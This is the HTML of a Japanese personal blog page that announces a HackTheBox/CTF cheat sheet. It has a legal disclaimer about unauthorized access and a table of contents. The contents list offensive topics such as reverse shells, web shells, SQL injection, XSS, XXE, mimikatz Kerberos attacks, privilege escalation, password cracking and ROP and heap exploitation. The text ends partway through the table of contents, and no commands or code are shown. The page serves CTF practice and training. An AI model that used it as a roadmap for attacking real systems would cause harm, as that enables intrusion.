<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.eb811466a875e3633795.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">【個人用】HackTheBox/CTF用のチートシートまとめ(作成中) - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="HackTheBox用のチートシートのまとめページ"/><meta data-react-helmet="true" property="og:site_name" content="【個人用】HackTheBox/CTF用のチートシートまとめ(作成中) - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:title" content="【個人用】HackTheBox/CTF用のチートシートまとめ(作成中) - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="HackTheBox用のチートシートのまとめページ"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"/><link as="script" rel="preload" href="/webpack-runtime-11f296c1c87b7169988c.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-7aaf3141ca615681a7e8.js"/><link as="script" rel="preload" href="/app-bcba0182970e9af19752.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-9bf27003829f242941c6.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/cheatsheet-main/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">【個人用】HackTheBox/CTF用のチートシートまとめ(作成中)</h1><div class="Content-module--content__body--2TrQ-"><p>個人的に使用しているHackTheBox用のチートシートをまとめました。</p>
<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>
<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>
<p>またすべての発言は所属団体ではなく個人に帰属します。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li><a href="#%E3%82%82%E3%81%8F%E3%81%98">もくじ</a></li>
<li>
<p><a href="#%E4%BD%BF%E7%94%A8%E9%A0%BB%E5%BA%A6%E3%81%AE%E9%AB%98%E3%81%84%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%BE%E3%81%A8%E3%82%81">使用頻度の高いコマンドまとめ</a></p>
<ul>
<li><a href="#%E6%94%BB%E7%95%A5%E9%96%8B%E5%A7%8B%E6%99%82%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">攻略開始時(ポートスキャン)</a></li>
<li><a href="#%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88">ネットワーク探索のポイント</a></li>
<li><a href="#web%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">Webスキャン</a></li>
<li><a href="#ftp%E6%8E%A5%E7%B6%9A">FTP接続</a></li>
<li><a href="#%E6%94%BB%E6%92%83%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E8%BB%A2%E9%80%81">攻撃ファイル転送</a></li>
<li><a href="#%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB">リバースシェル</a></li>
<li><a href="#%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%AE%E7%94%9F%E6%88%90">ペイロードの生成</a></li>
</ul>
</li>
<li>
<p><a href="#%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%84%E3%83%BC%E3%83%AB%E3%81%BE%E3%81%A8%E3%82%81">スキャンツールまとめ</a></p>
<ul>
<li><a href="#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">ポートスキャン</a></li>
<li><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">データベースのスキャン</a></li>
<li><a href="#windowssamba%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">Windows/Sambaシステムのスキャン</a></li>
<li><a href="#active-directory%E7%92%B0%E5%A2%83%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">Active Directory環境のスキャン</a></li>
<li><a href="#web%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">Web脆弱性スキャン</a></li>
</ul>
</li>
<li>
<p><a href="#web%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%BE%E3%81%A8%E3%82%81">Webエクスプロイトまとめ</a></p>
<ul>
<li><a href="#web-shell%E3%82%92%E4%BD%BF%E3%81%86">Web Shellを使う</a></li>
<li><a href="#sql-injection">SQL injection</a></li>
<li><a href="#xss">XSS</a></li>
<li><a href="#xml-external-entityxml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7">XML External Entity(XML外部実体参照)</a></li>
</ul>
</li>
<li>
<p><a href="#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88">その他のエクスプロイト</a></p>
<ul>
<li><a href="#smbactive-directory%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%9F%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9">SMB、Active Directoryを悪用したリモートアクセス</a></li>
</ul>
</li>
<li>
<p><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2windows">内部探索(Windows)</a></p>
<ul>
<li><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88">内部探索のポイント</a></li>
<li><a href="#%E7%AB%AF%E6%9C%AB%E6%83%85%E5%A0%B1%E3%81%AE%E5%8F%96%E5%BE%97">端末情報の取得</a></li>
<li><a href="#windows%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%AE%E7%89%B9%E5%AE%9A">Windowsエクスプロイトの特定</a></li>
<li><a href="#windows%E3%83%A6%E3%83%BC%E3%82%B6%E6%83%85%E5%A0%B1%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%89%B9%E6%A8%A9%E3%81%AE%E6%8E%A2%E7%B4%A2">Windowsユーザ情報、セキュリティ特権の探索</a></li>
<li><a href="#uac%E3%81%AE%E5%A4%89%E6%9B%B4">UACの変更</a></li>
<li><a href="#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E5%85%B1%E6%9C%89%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%81%AE%E6%A8%A9%E9%99%90%E3%81%AE%E6%8E%A2%E7%B4%A2">フォルダ、共有フォルダの権限の探索</a></li>
<li><a href="#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%AE%E7%A2%BA%E8%AA%8D">環境変数の確認</a></li>
</ul>
</li>
<li>
<p><a href="#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97windows">特権取得(Windows)</a></p>
<ul>
<li><a href="#mimikatz%E3%81%A7kerberos%E7%92%B0%E5%A2%83%E3%82%92%E6%94%BB%E6%92%83%E3%81%99%E3%82%8B">mimikatzでKerberos環境を攻撃する</a></li>
<li><a href="#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E7%89%B9%E6%A8%A9%E6%98%87%E6%A0%BC%E3%83%84%E3%83%BC%E3%83%AB">ローカル特権昇格ツール</a></li>
</ul>
</li>
<li>
<p><a href="#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2linux">内部探索(Linux)</a></p>
<ul>
<li><a href="#%E4%BE%BF%E5%88%A9%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89">便利コマンド</a></li>
<li><a href="#linpeas%E3%81%AEtips">linpeasのTips</a></li>
<li><a href="#%E7%AB%AF%E6%9C%AB%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%8E%A2%E7%B4%A2">端末のディレクトリ探索</a></li>
</ul>
</li>
<li><a href="#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97linux">特権取得(Linux)</a></li>
<li>
<p><a href="#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E8%A7%A3%E8%AA%AD">パスワードの解読</a></p>
<ul>
<li><a href="#hashcat%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB">Hashcatサンプル</a></li>
<li><a href="#hashcat-%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3tips">Hashcat オプションTips</a></li>
<li><a href="#keepass-database">KeePass database</a></li>
</ul>
</li>
<li>
<p><a href="#pwn%E3%81%AEtips">pwnのTips</a></p>
<ul>
<li><a href="#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%83%90%E3%82%A4%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E9%80%81%E3%82%8A%E8%BE%BC%E3%82%80">プロセスにバイトコードを送り込む</a></li>
<li><a href="#return-to-pltreturn-to-libc">Return to PLT/Return to libc</a></li>
<li><a href="#%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E6%94%BB%E6%92%83%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB">書式文字攻撃サンプル</a></li>
<li><a href="#rop%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB">ROPサンプル</a></li>
<li><a href="#got-overwrite%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB">GOT Overwriteサンプル</a></li>
<li><a href="#glib%E3%83%AA%E3%83%B3%E3%82%AB%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E5%95%8F%E9%A1%8C">glib、リンカのバージョン問題</a></li>
<li><a href="#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%81%A7%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92xinted%E3%81%99%E3%82%8B">ローカルでバイナリをxintedする</a></li>
<li><a href="#heap-exploit">Heap Exploit</a></li>
<li><a href="#pwn%E5%8F%82%E8%80%83%E8%A8%98%E4%BA%8B">Pwn参考記事</a></li>
</ul>
</li>
<li>
<p><a href="#gdb%E3%81%AEtips">gdbのTips</a></p>
<ul>
<li><a href="#%E3%83%95%E3%83%A9%E3%82%B0%E7%BD%AE%E3%81%8D%E6%8F%9B%E3%81%88%E6%96%B9%E6%B3%95">フラグ置き換え方法</a></li>
<li><a href="#%E6%9D%A1%E4%BB%B6%E3%82%B8%E3%83%A3%E3%83%B3%E3%83%97%E5%91%BD%E4%BB%A4%E3%83%A1%E3%83%A2">条件ジャンプ命令メモ</a></li>
